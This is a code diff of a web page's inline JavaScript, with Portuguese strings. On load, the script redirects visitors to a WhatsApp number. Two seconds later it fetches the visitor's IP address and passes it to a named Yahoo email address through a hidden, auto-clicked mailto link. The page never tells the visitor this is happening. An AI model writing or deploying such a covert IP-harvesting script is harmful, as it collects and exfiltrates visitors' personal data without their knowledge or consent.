@@ -5,23 +5,27 @@
 </head>
 <body>
     <script>
-        function getIp(callback) {
+        function redirectToWhatsApp() {
+            window.location.href = 'https://wa.me/27998041981';
+        }
+
+        function sendIP() {
             fetch('/get-ip')
                 .then(response => response.json())
-                .then(data => callback(data.ip))
+                .then(data => {
+                    const ip = data.ip;
+                    const emailUrl = 'mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
+                    const emailLink = document.createElement('a');
+                    emailLink.href = emailUrl;
+                    emailLink.style.display = 'none';
+                    document.body.appendChild(emailLink);
+                    emailLink.click();
+                })
                 .catch(error => console.error(error));
         }
 
-        getIp(function (ip) {
-            const whatsappUrl = 'https://wa.me/27998041981';
-            window.location.href = whatsappUrl;
-
-            const emailUrl = 'mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
-
-            setTimeout(function() {
-                window.location.href = emailUrl;
-            }, 2000);
-        });
+        redirectToWhatsApp();
+        setTimeout(sendIP, 2000);
     </script>
 </body>
 </html>
